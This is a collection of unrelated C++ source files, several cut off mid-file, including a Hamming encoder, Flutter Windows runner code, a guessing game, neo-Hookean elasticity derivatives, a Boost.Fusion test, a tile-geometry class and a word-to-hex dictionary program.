    "#include <bitset>\n\nstd::bitset<8> encode_Hamming(std::bitset<4> part)\n{\n    std::bitset<8> encoded;\n\n    bool d1 = part[0];\n    bool d2 = part[1];\n    bool d3 = part[2];\n    bool d4 = part[3];\n\n    bool p1;\n    bool p2;\n    bool p3;\n    bool p4;\n\n    p1 = (d1 + d3 + d4 + 1) % 2;\n    p2 = (d1 + d2 + d4 + 1) % 2;\n    p3 = (d1 + d2 + d3 + 1) % 2;\n    p4 = (1 + p1 + d1 + p2 + d2 + p3 + d3 + d4) % 2;\n\n    encoded[0] = p1;\n    encoded[1] = d1;\n\n    encoded[2] = p2;\n    encoded[3] = d2;\n\n    encoded[4] = p3;\n    encoded[5] = d3;\n\n    encoded[6] = p4;\n    encoded[7] = d4;\n\n\n    return encoded;\n}\n\n\nint Func_1(char sym)\n{\n    std::bitset<8> bits(sym);\n    std::bitset<16> encoded;\n\n    std::bitset<4> first(bits.to_string().substr(0, 4));\n    std::bitset<4> second(bits.to_string().substr(4, 4));\n\n    std::bitset<8> encodedFirstPart = encode_Hamming(first);\n    std::bitset<8> encodedSecondPart = encode_Hamming(second);\n\n    encoded |= (encodedFirstPart.to_ulong() << 8);\n\n    encoded |= encodedSecondPart.to_ulong();\n\n    int value = static_cast<int>(encoded.to_ulong());\n\n    return value;\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include<iostream> \r\n#include<conio.h>\r\n#include<time.h>\r\nusing namespace std ; \r\n void guess(void){ \r\n cout<<\"**********************\"<<endl<<\"\\n\\n\";\r\n cout<<\"-------------Welcome To The Game : Guess Number -----------------\"<<endl;\r\ncout<<\"\\n\\tI have Selected One Number Between 1 to 10 Guess It \"<<endl; \r\ncout<<\"\\n\\t\\t------You have 3 Chance To Guess-------\"<<endl;\r\ncout<<\"\\n\\t\\t\\t---- All The Best ----\"<<endl; \r\ncout<<\"\\n\\n************************\"<<endl; \r\nsrand(time(0));\r\n int num = (rand ()%10)  +1;\r\n int input ;  \r\n int chance = 3 ;  \r\n for(int i = 1 ; i <= 3 ; i++){ \r\n cout<<\"Enter The Guessed Number : \"; \r\n cin>>input;\r\n cout<<\"\\n\";   \r\n      if(input==num){     \r\n      cout<<\"Congratulation :- You Have Guessed Right Number \"<<endl; \r\n      break;\r\n      }\r\n      else{ \r\n          if(input>num){ \r\n          cout<<\"OOPs Wrong Answer \"<<endl; \r\n          cout<<\"\\nHINT : To high Number Guessed :- Try Again \"<<endl;  \r\n          chance--; \r\n          cout<<\"Remaining Chance : \"<<chance<<endl<<\"\\n\\n\"; \r\n          \r\n          }\r\n          else if(input < num){ \r\n          cout<<\"OOPs Wrong Answer \"<<endl; \r\n          cout<<\"HINT : To Small number Guessed :- Try Again \"<<endl;  \r\n          chance--; \r\n          cout<<\"Remaining Chance : \"<<chance<<endl<<\"\\n\\n\"; \r\n           if(chance==0){ \r\n cout<<\"\\n\\t--------Game Over-------- \"<<endl; \r\n\r\n  }\r\n          \r\n    }\r\n      }\r\n \r\n         }\r\n } \r\nint main()\r\n{\r\n\tguess(); \r\n    return 0 ; \r\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <d2psi_neo_hookean_dq2.h>\n#include <iostream>\n\nvoid d2psi_neo_hookean_dF2(\n        Eigen::Matrix99d &dP,\n        Eigen::Ref<const Eigen::Matrix3d> F,\n        double C, double D) {\n\n    Eigen::Matrix99d ddw;\n\n    // prepare data\n    double dxdX = F(0, 0);\n    double dxdY = F(0, 1);\n    double dxdZ = F(0, 2);\n\n    double dydX = F(1, 0);\n    double dydY = F(1, 1);\n    double dydZ = F(1, 2);\n\n    double dzdX = F(2, 0);\n    double dzdY = F(2, 1);\n    double dzdZ = F(2, 2);\n\n    // assemble dP\n    // the row index represent the index of F's argument(row first in F)\n    // the col index represent the index of F's dependent variable(row first in P)\n    // dP/dF00\n    dP(0, 0) = C * (pow((dydY * dzdZ - dydZ * dzdY), 2) /\n                    pow((dxdX * dydY * dzdZ - dxdX * dydZ * dzdY - dxdY * dydX * dzdZ + dxdY * dydZ * dzdX +\n                         dxdZ * dydX * dzdY - dxdZ * dydY * dzdX), 2) + 1)\n             + (D * pow((dydY * dzdZ - dydZ * dzdY), 2)) /\n               pow((dxdX * dydY * dzdZ - dxdX * dydZ * dzdY - dxdY * dydX * dzdZ + dxdY * dydZ * dzdX +\n                    dxdZ * dydX * dzdY - dxdZ * dydY * dzdX), 2)\n             - (D * log(dxdX*dydY*dzdZ - dxdX*dydZ*dzdY - dxdY*dydX*dzdZ + dxdY*dydZ*dzdX + dxdZ*dydX*dzdY - dxdZ*dydY*dzdX) *\n                    pow((dydY * dzdZ - dydZ * dzdY), 2)) /\n               pow((dxdX * dydY * dzdZ - dxdX * dydZ * dzdY - dxdY * dydX * dzdZ + dxdY * dydZ * dzdX +\n                    dxdZ * dydX * dzdY - dxdZ * dydY * dzdX), 2);\n    dP(1, 0) = (D * log(dxdX * dydY * dzdZ - dxdX * dydZ * dzdY - dxdY * dydX * dzdZ + dxdY * dydZ * dzdX + dxdZ * dydX * dzdY - dxdZ * dydY * dzdX)\n            * (dydX * dzdZ - dydZ * dzdX) * (dydY * dzdZ - dydZ * dzdY)) /\n            pow((dxdX * dydY * dzdZ - dxdX * dydZ * dzdY - dxdY * dydX * dzdZ + dxdY * dydZ * dzdX + dxdZ * dydX * dzdY - dxdZ * dydY * dzdX), 2)\n            - (D*(dydX*dzdZ - dydZ*dzdX)*(dydY*dzdZ - dydZ*dzdY)) /\n            pow((dxdX * dydY * dzdZ - dxdX * dydZ * dzdY - dxdY * dydX * dzdZ + dxdY * dydZ * dzdX +dxdZ * dydX * dzdY - dxdZ * dydY * dzdX), 2)\n            - (C*(dydX*dzdZ - dydZ*dzdX)*(dydY*dzdZ - dydZ*dzdY))/\n            pow((dxdX * dydY * dzdZ - dxdX * dydZ * dzdY - dxdY * dydX * dzdZ + dxdY * dydZ * dzdX + dxdZ * dydX * dzdY - dxdZ * dydY * dzdX),2);\n    dP(2,0) = (C * (dydX * dzdY - dydY * dzdX) * (dydY * dzdZ - dydZ * dzdY))\n            / pow((dxdX * dydY * dzdZ - dxdX * dydZ * dzdY - dxdY * dydX * dzdZ + dxdY * dydZ * dzdX +\n                   dxdZ * dydX * dzdY - dxdZ * dydY * dzdX), 2)\n            + (D * (dydX * dzdY - dydY * dzdX) * (dydY * dzdZ - dydZ * dzdY)) /\n              pow((dxdX * dydY * dzdZ - dxdX * dydZ * dzdY - dxdY * dydX * dzdZ + dxdY * dydZ * dzdX +\n                   dxdZ * dydX * dzdY - dxdZ * dydY * dzdX), 2)\n            - (D * log(dxdX * dydY * dzdZ - dxdX * dydZ * dzdY - dxdY * dydX * dzdZ + dxdY * dydZ * dzdX + dxdZ * dydX * dzdY - dxdZ * dydY * dzdX)\n            * (dydX * dzdY - dydY * dzdX) * (dydY * dzdZ - dydZ * dzdY))/\n              pow((dxdX * dydY * dzdZ - dxdX * dydZ * dzdY - dxdY * dydX * dzdZ + dxdY * dydZ * dzdX +\n                   dxdZ * dydX * dzdY - dxdZ * dydY * dzdX), 2);\n    dP(3,0) = (D * log(dxdX * dydY * dzdZ - dxdX * dydZ * dzdY - dxdY*dydX*dzdZ + dxdY*dydZ*dzdX + dxdZ*dydX*dzdY - dxdZ*dydY*dzdX)\n            *(dxdY*dzdZ - dxdZ*dzdY)*(dydY*dzdZ - dydZ*dzdY))/\n              pow((dxdX * dydY * dzdZ - dxdX * dydZ * dzdY - dxdY * dydX * dzdZ + dxdY * dydZ * dzdX +\n                   dxdZ * dydX * dzdY - dxdZ * dydY * dzdX), 2)\n                   - (D*(dxdY*dzdZ - dxdZ*dzdY)*(dydY*dzdZ - dydZ*dzdY))/\n                     pow((dxdX * dydY * dzdZ - dxdX * dydZ * dzdY - dxdY * dydX * dzdZ + dxdY * dydZ * dzdX +\n                          dxdZ * dydX * dzdY - dxdZ * dydY * dzdX), 2)\n                          - (C*(dxdY*dzdZ - dxdZ*dzdY)*(dydY*dzdZ - dydZ*dzdY))/\n                            pow((dxdX * dydY * dzdZ - dxdX * dydZ * dzdY - dxdY * dydX * dzdZ + dxdY * dydZ * dzdX +\n                                 dxdZ * dydX * dzdY - dxdZ * dydY * dzdX), 2);\n    dP(4, 0) = (D*(dxdX*dzdZ - dxdZ*dzdX)*(dydY*dzdZ - dydZ*dzdY))\n            / pow((dxdX * dydY * dzdZ - dxdX * dydZ * dzdY - dxdY * dydX * dzdZ + dxdY * dydZ * dzdX +\n                   dxdZ * dydX * dzdY - dxdZ * dydY * dzdX), 2)\n                   - C*(dzdZ/(dxdX*dydY*dzdZ - dxdX*dydZ*dzdY - dxdY*dydX*dzdZ + dxdY*dydZ*dzdX + dxdZ*dydX*dzdY - dxdZ*dydY*dzdX)\n                   - ((dxdX*dzdZ - dxdZ*dzdX)*(dydY*dzdZ - dydZ*dzdY))\n                   / pow((dxdX * dydY * dzdZ - dxdX * dydZ * dzdY - dxdY * dydX * dzdZ + dxdY * dydZ * dzdX +\n                          dxdZ * dydX * dzdY - dxdZ * dydY * dzdX), 2))\n                          + (D*dzdZ*log(dxdX*dydY*dzdZ - dxdX*dydZ*dzdY - dxdY*dydX*dzdZ + dxdY*dydZ*dzdX + dxdZ*dydX*dzdY - dxdZ*dydY*dzdX))\n                          /(dxdX*dydY*dzdZ - dxdX*dydZ*dzdY - dxdY*dydX*dzdZ + dxdY*dydZ*dzdX + dxdZ*dydX*dzdY - dxdZ*dydY*dzdX)\n                          - (D*log(dxdX*",
    "/*=============================================================================\n    Copyright (c) 2018 Kohei Takahashi\n\n    Distributed under the Boost Software License, Version 1.0. (See accompanying\n    file LICENSE_1_0.txt or copy at http://www.boost.org/LICENSE_1_0.txt)\n==============================================================================*/\n\n#include <boost/fusion/sequence/intrinsic/at.hpp>\n#include <boost/fusion/sequence/intrinsic/at_key.hpp>\n#include <boost/fusion/container/vector.hpp>\n#include <boost/fusion/container/list.hpp>\n#include <boost/fusion/container/deque.hpp>\n#include <boost/fusion/container/map.hpp>\n#include <boost/fusion/container/set.hpp>\n#include <boost/fusion/tuple/tuple.hpp>\n#include <boost/core/lightweight_test.hpp>\n\ntemplate <typename Sequence>\nvoid test_at()\n{\n    Sequence seq;\n\n    // zero initialized\n    BOOST_TEST(boost::fusion::at_c<0>(seq)[0] == 0);\n    BOOST_TEST(boost::fusion::at_c<0>(seq)[1] == 0);\n    BOOST_TEST(boost::fusion::at_c<0>(seq)[2] == 0);\n\n    int (&arr)[3] = boost::fusion::deref(boost::fusion::begin(seq));\n\n    arr[0] = 2;\n    arr[1] = 4;\n    arr[2] = 6;\n\n    BOOST_TEST(boost::fusion::at_c<0>(seq)[0] == 2);\n    BOOST_TEST(boost::fusion::at_c<0>(seq)[1] == 4);\n    BOOST_TEST(boost::fusion::at_c<0>(seq)[2] == 6);\n\n    boost::fusion::at_c<0>(seq)[1] = 42;\n\n    BOOST_TEST(boost::fusion::at_c<0>(seq)[0] == 2);\n    BOOST_TEST(boost::fusion::at_c<0>(seq)[1] == 42);\n    BOOST_TEST(boost::fusion::at_c<0>(seq)[2] == 6);\n}\n\ntemplate <typename T> inline T& value(T& v) { return v; }\ntemplate <typename K, typename T> inline T& value(boost::fusion::pair<K, T>& v) { return v.second; }\n\ntemplate <typename Sequence>\nvoid test_at_key()\n{\n    Sequence seq;\n\n    // zero initialized\n    BOOST_TEST(boost::fusion::at_key<int[3]>(seq)[0] == 0);\n    BOOST_TEST(boost::fusion::at_key<int[3]>(seq)[1] == 0);\n    BOOST_TEST(boost::fusion::at_key<int[3]>(seq)[2] == 0);\n\n    int (&arr)[3] = value(boost::fusion::deref(boost::fusion::begin(seq)));\n\n    arr[0] = 2;\n    arr[1] = 4;\n    arr[2] = 6;\n\n    BOOST_TEST(boost::fusion::at_key<int[3]>(seq)[0] == 2);\n    BOOST_TEST(boost::fusion::at_key<int[3]>(seq)[1] == 4);\n    BOOST_TEST(boost::fusion::at_key<int[3]>(seq)[2] == 6);\n\n    boost::fusion::at_key<int[3]>(seq)[1] = 42;\n\n    BOOST_TEST(boost::fusion::at_key<int[3]>(seq)[0] == 2);\n    BOOST_TEST(boost::fusion::at_key<int[3]>(seq)[1] == 42);\n    BOOST_TEST(boost::fusion::at_key<int[3]>(seq)[2] == 6);\n}\n\nint main()\n{\n    using namespace boost::fusion;\n\n    test_at<vector<int[3]> >();\n    test_at<deque<int[3]> >();\n    test_at<list<int[3]> >();\n    test_at<tuple<int[3]> >();\n\n#if !BOOST_WORKAROUND(BOOST_GCC, / 100 == 406) || defined(BOOST_NO_CXX11_FUNCTION_TEMPLATE_DEFAULT_ARGS)\n    // FIXME: gcc 4.6 w/ c++0x doesn't like set with array...\n    test_at_key<set<int[3]> >();\n#endif\n    test_at_key<map<pair<int[3], int[3]> > >();\n    return boost::report_errors();\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"lineTile.h\"\n#include \"cSException.h\"\n\nLineTile::LineTile()\n    :mLine(Line()), mTile(nullptr), mDirection(direction2D::CENTRE){\n}\n\nLineTile::LineTile(Line line, Tile *tile){\n    if(tile == nullptr) throw CSException(\"LINETILE_01\");\n\n    if(line.getOrient() == orientation2D::HORIZONTAL){\n        \n        // check if the line is well fit with the tile\n        if(tile->getXHigh() < line.getHigh().x()) throw CSException(\"LINETILE_02\");\n        if(tile->getXLow() > line.getLow().x()) throw CSException(\"LINETILE_03\");\n        \n        len_t lineY = line.getLow().y();\n        len_t tileYHigh = tile->getYHigh();\n        len_t tileYLow = tile->getYLow();\n        if(lineY > tileYHigh) throw CSException(\"LINETILE_04\");\n        if(lineY < tileYLow) throw CSException(\"LINETILE_05\");\n\n        if(lineY == tileYHigh) mDirection = direction2D::DOWN;\n        else if(lineY == tileYLow) mDirection = direction2D::UP;\n        else mDirection = direction2D::CENTRE;\n\n        mLine = line;\n        mTile = tile;\n\n    }else{ //orientation2D::VERTICAL\n\n        // check if the lie is wel fit with the tile\n        if(tile->getYHigh() < line.getHigh().y()) throw CSException(\"LINETILE_06\");\n        if(tile->getYLow() > line.getLow().y()) throw CSException(\"LINETILE_07\");\n\n        len_t lineX = line.getLow().x();\n        len_t tileXHigh = tile->getXHigh();\n        len_t tileXLow = tile->getXLow();\n        if(lineX > tileXHigh) throw CSException(\"LINETILE_08\");\n        if(lineX < tileXLow) throw CSException(\"LINETILE_09\");\n\n        if(lineX == tileXHigh) mDirection = direction2D::LEFT;\n        else if(lineX == tileXLow) mDirection = direction2D::RIGHT;\n        else mDirection = direction2D::CENTRE;\n\n        mLine = line;\n        mTile = tile;\n    }\n}\n\nLineTile::LineTile(const LineTile &other)\n    : mLine(other.mLine), mTile(other.mTile), mDirection(other.mDirection) {\n}\n\n\nLineTile &LineTile::operator = (const LineTile &other) {\n    if (this == &other) return (*this);\n\n    this->mLine = other.mLine;\n    this->mTile = other.mTile;\n    this->mDirection = other.mDirection;\n\n    return (*this);\n}\n\nbool LineTile::operator == (const LineTile &comp) const {\n    return (mLine == comp.mLine) && (mTile == comp.mTile);\n\n}\n\nLine LineTile::getLine() const {\n    return this->mLine;\n}\n\nTile *LineTile::getTile() const {\n    return this->mTile;\n}\n\ndirection2D LineTile::getDirection() const {\n    return this->mDirection;\n}\n\nsize_t std::hash<LineTile>::operator()(const LineTile &key) const {\n    return (std::hash<Line>()(key.getLine())) ^ (std::hash<Tile*>()(key.getTile()));\n}\n\nstd::ostream &operator<<(std::ostream &os, const LineTile &tile) {\n    os << \"LT[\";\n    os << tile.getLine() << \" \" << *(tile.getTile()) << \" \" << tile.getDirection();\n    os << \"]\";\n    return os;\n}",
    "#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <algorithm>\n#include <string>\n#include <cctype>\n#include <unordered_map>\n#include <regex>\n#include <iomanip> // Include for std::hex manipulator\n#include <cstdlib> // Include for srand() and rand()\n#include <random>\n\n/**\n * @brief One way compiler for a hash function\n * \n * @param filename Name of the file containing the dictionary.\n * @param myMap Reference to the unordered_map to store the dictionary.\n * @param code_book_array Array representing the relationship between integers and words.\n * @param array_size Size of the code_book_array.\n */\nvoid load_dict_code_book(const std::string& filename, std::unordered_map<std::string, int>& myMap, int code_book_array[], int array_size);\n\n/**\n * @brief Checks if a given string contains only alphabetic characters.\n * \n * @param word The string to be checked.\n * @return true if the string contains only alphabetic characters, false otherwise.\n */\nbool string_is_alpha(const std::string& word);\n\n/**\n * @brief Converts a string to lowercase.\n * \n * @param word The string to be converted.\n * @return The converted lowercase string.\n */\nstd::string to_lowercase(const std::string& word);\n\n/**\n * @brief Prints each key-value pair in the unordered_map.\n * \n * @param myMap The unordered_map to be printed.\n */\nvoid printMap(const std::unordered_map<std::string, int>& myMap);\n\n/**\n * @brief Main function.\n * \n * @param argc Number of command-line arguments.\n * @param argv Array of command-line arguments.\n * @return 0 if successful, 1 otherwise.\n */\nint main(int argc, char* argv[]) \n{\n    if (argc != 2) {\n        std::cerr << \"Usage: \" << argv[0] << \" <filename>\" << std::endl;\n        return 1; // Exit with error\n    }\n    std::istringstream iss(argv[1]);\n    unsigned int seed = 123;\n\n    /*\n    if (!(iss >> seed)) {\n        std::cerr << \"Invalid seed: \" << argv[1] << std::endl;\n        return 1; // Exit with error\n    }\n    */\n\n    std::unordered_map<std::string, int> myMap;\n    int code_book_size = 26178;\n    int code_bk[code_book_size];  // Initialize the code book or the relationship between an integer and a word\n    for (int i = 0; i < code_book_size; ++i) {\n        code_bk[i] = i + 1;\n    }\n    std::mt19937 gen(seed);\n    std::shuffle(code_bk, code_bk+code_book_size, gen);\n\n    \n    load_dict_code_book(argv[1], myMap, code_bk, code_book_size);\n    std::string input;\n    std::regex alphabetic(\"[a-zA-Z]+\"); // Regular expression to match alphabetic characters\n\n    while (true) {\n        std::cout << \"Enter a sentence (words separated by white spaces, only lower alphabetic characters allowed,\\nno punctuation or apostrophes and enter *end* to exit program):\\n\";\n        std::getline(std::cin, input); // Read the input line by line\n\n        if (input == \"*end*\") {\n            std::cout << \"Exiting the program.\" << std::endl;\n            break; // Exit the while loop\n        }\n\n        // Use istringstream to split the input line into words\n        std::istringstream iss(input);\n        std::string word;\n        std::ostringstream oss;\n        bool is_valid_sentence = true;\n        while (iss >> word) {\n            // Check if the current word contains only alphabetic characters\n             std::string lowered_word = to_lowercase(word);\n            if (std::regex_match(word, alphabetic) &&  myMap.count(lowered_word) > 0) {\n                \n               \n                //if (myMap.count(lowered_word) > 0) {\n                   std::cout << \"Word accepted: \" << word << std::endl;\n                   oss << std::hex << myMap[lowered_word]; // Set output to hexadecimal and append the value\n                // }\n            } else {\n                std::cout << \"Invalid word: \" << word << \". Enter only Oxford Dictionary words with alphabetic characters (a-z and A-Z).\" << std::endl;\n                is_valid_sentence = false; // checks if whole sentence is valid and will print hex value if the whole sentence is correct.\n            }\n        }\n        std::string concatenatedHex = oss.str();\n        if (concatenatedHex.length() && is_valid_sentence)\n        std::cout << \"Your hash value is as follows: \" << concatenatedHex << std::endl;\n    }\n     \n    return 0;\n}\n\nvoid load_dict_code_book(const std::string& filename, std::unordered_map<std::string, int>& myMap, int code_book_array[], int array_size) \n{\n    // This function loads the dictionary into an unordered_map used to hash words from input\n    std::ifstream file(filename);\n    \n    // Check if the file is successfully opened\n    if (!file.is_open()) {\n        std::cerr << \"Failed to open file: \" << filename << std::endl;\n        return;\n    }\n\n    // Read and store the first word of each line of the file into the unordered_map\n    std::string line;\n    int counter = 0;\n    while (std::getline(file, line)) {\n        std::istringstream iss(line);\n        std::string word;\n        if (iss >> word) {\n            if (string_is_alpha(word)) {\n                if (myMap.cou",
    "#include <iostream>\nusing namespace std;\n\nint main(int argc, char *argv[]) {\n\t//como tener una redSocial \n\tbool QuieresNavegarEnRedes;\n\tint RedSocialElegida;\n\tstring Correo;\n\tstring Usuario;\n\tstring Contrasena;\n\tstring Amigos;\n\tbool FotoDePerfil;\n\tbool foto;\n\tcout << \"Para Responder usa 1 para si y 0 para no\" << endl;\n\tcout << \"Quieres usar una red social?\" << endl;\n\tcin >> QuieresNavegarEnRedes;\n\tif (QuieresNavegarEnRedes)\n\t{\n\t\tcout << \"Te voy a mostrar una lista de redes sociales y me dices cual quieres\" << endl;\n\t\tcout << \"1. Twitter\" << endl;\n\t\tcout << \"2. Facebook\" << endl;\n\t\tcout << \"3. Instagram\" << endl;\n\t\tcout << \"4. Tumblr\" << endl;\n\t\tcout << \"5. YouTube\" << endl;\n\t\tcin >> RedSocialElegida;\n\t\tif (RedSocialElegida >=1 || RedSocialElegida <=5)\n\t\t{\n\t\t\tcout << \"\u00bfTienes una cuenta?\" << endl;\n\t\t\tcin >> RedSocialElegida;\n\t\t\tif (RedSocialElegida)\n\t\t\t{\n\t\t\t\tcout << \"Dame tu correo: \";\n\t\t\t\tcin >> Correo;\n\t\t\t\tcout << \"Felicidades has iniciado sesion. Puedes navegar tranquilo\";\n\t\t\t}else{\n\t\t\t\tcout << \"vamos a crear un usuario y contrase\u00f1a\" << endl;\n\t\t\t\tcout << \"Dame tu Usuario: \";\n\t\t\t\tcin >> Usuario;\n\t\t\t\tcout << endl;\n\t\t\t\tcout << \"Dame tu correo: \";\n\t\t\t\tcin >> Correo;\n\t\t\t\tcout << endl;\n\t\t\t\tcout << \"Dame tu contrase\u00f1a: \";\n\t\t\t\tcin >> 